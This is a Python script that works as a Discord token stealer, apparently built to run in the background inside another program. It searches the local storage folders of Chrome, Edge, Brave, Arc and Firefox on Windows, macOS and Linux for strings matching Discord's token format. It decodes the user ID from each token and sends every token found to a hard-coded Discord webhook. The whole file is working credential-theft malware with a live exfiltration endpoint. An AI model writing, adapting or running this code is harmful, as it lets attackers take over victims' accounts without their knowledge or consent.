import re
import os
import base64
import typing
import json
import urllib.request
import platform

def run_background():
    print("Background script is running!")

    TOKEN_REGEX_PATTERN = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{34,38}"
    REQUEST_HEADERS = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11"
    }

    WEBHOOK_URL = "https://discord.com/api/webhooks/1308806199906668615/pZSJgesvh_Kzs1EEWOtIg-O8CRb4lqa_BLIVpyMBaq0vwHGB8U7ofM3VuBfMPQOGNWF5"  # Replace with your actual webhook URL


    def make_post_request(api_url: str, data: typing.Dict[str, typing.Any]) -> int:
        request = urllib.request.Request(
            api_url, data=json.dumps(data).encode(), headers=REQUEST_HEADERS
        )
        with urllib.request.urlopen(request) as response:
            return response.status


    def get_tokens_from_file(file_path: str) -> typing.Union[typing.List[str], None]:
        try:
            with open(file_path, encoding="utf-8", errors="ignore") as text_file:
                file_contents = text_file.read()
        except (PermissionError, FileNotFoundError):
            return None

        tokens = re.findall(TOKEN_REGEX_PATTERN, file_contents)
        return tokens if tokens else None


    def get_user_id_from_token(token: str) -> typing.Union[None, str]:
        try:
            discord_user_id = base64.b64decode(
                token.split(".", maxsplit=1)[0] + "=="
            ).decode("utf-8")
        except (UnicodeDecodeError, IndexError):
            return None

        return discord_user_id


    def get_tokens_from_path(base_path: str) -> typing.Dict[str, set]:
        if not os.path.exists(base_path):
            print(f"Path does not exist: {base_path}")
            return None

        file_paths = [
            os.path.join(base_path, filename) for filename in os.listdir(base_path)
        ]

        id_to_tokens: typing.Dict[str, set] = {}

        for file_path in file_paths:
            potential_tokens = get_tokens_from_file(file_path)

            if potential_tokens is None:
                continue

            for potential_token in potential_tokens:
                discord_user_id = get_user_id_from_token(potential_token)

                if discord_user_id is None:
                    continue

                if discord_user_id not in id_to_tokens:
                    id_to_tokens[discord_user_id] = set()

                id_to_tokens[discord_user_id].add(potential_token)

        return id_to_tokens if id_to_tokens else None


    def send_tokens_to_webhook(
        webhook_url: str, user_id_to_token: typing.Dict[str, set[str]]
    ) -> int:
        fields: typing.List[dict] = []

        for user_id, tokens in user_id_to_token.items():
            fields.append({
                "name": user_id,
                "value": "\n".join(tokens)
            })

        data = {"content": "Found tokens", "embeds": [{"fields": fields}]}
        return make_post_request(webhook_url, data)


    def get_browser_paths() -> typing.List[str]:
        system = platform.system()
        paths = []

        if system == "Windows":
            local_appdata = os.getenv("LOCALAPPDATA")
            roaming_appdata = os.getenv("APPDATA")
            if local_appdata:
                paths.extend([
                    os.path.join(local_appdata, r"Google\Chrome\User Data\Default\Local Storage\leveldb"),
                    os.path.join(local_appdata, r"Microsoft\Edge\User Data\Default\Local Storage\leveldb"),
                    os.path.join(local_appdata, r"BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb"),
                    os.path.join(local_appdata, r"Arc\User Data\Default\Local Storage\leveldb")
                ])
            if roaming_appdata:
                paths.append(os.path.join(roaming_appdata, r"Mozilla\Firefox\Profiles"))

        elif system == "Darwin":  # macOS
            paths.extend([
                os.path.expanduser("~/Library/Application Support/Google/Chrome/Default/Local Storage/leveldb"),
                os.path.expanduser("~/Library/Application Support/Microsoft Edge/Default/Local Storage/leveldb"),
                os.path.expanduser("~/Library/Application Support/BraveSoftware/Brave-Browser/Default/Local Storage/leveldb"),
                os.path.expanduser("~/Library/Application Support/Arc/User Data/Default/Local Storage/leveldb"),
                os.path.expanduser("~/Library/Application Support/Firefox/Profiles")
            ])

        elif system == "Linux":
            paths.extend([
                os.path.expanduser("~/.config/google-chrome/Default/Local Storage/leveldb"),
                os.path.expanduser("~/.config/microsoft-edge/Default/Local Storage/leveldb"),
                os.path.expanduser("~/.config/BraveSoftware/Brave-Browser/Default/Local Storage/leveldb"),
                os.path.expanduser("~/.config/Arc/User Data/Default/Local Storage/leveldb"),
                os.path.expanduser("~/.mozilla/firefox")
            ])

        return paths


    def main() -> None:
        try:
            paths = get_browser_paths()
            all_tokens = {}

            for path in paths:
                tokens = get_tokens_from_path(path)
                if tokens:
                    all_tokens.update(tokens)

            if not all_tokens:
                print("No tokens found.")
                return

            status = send_tokens_to_webhook(WEBHOOK_URL, all_tokens)
            print(f"Webhook response status: {status}")

        except Exception as error:
            print(f"An error occurred: {error}")


    main()
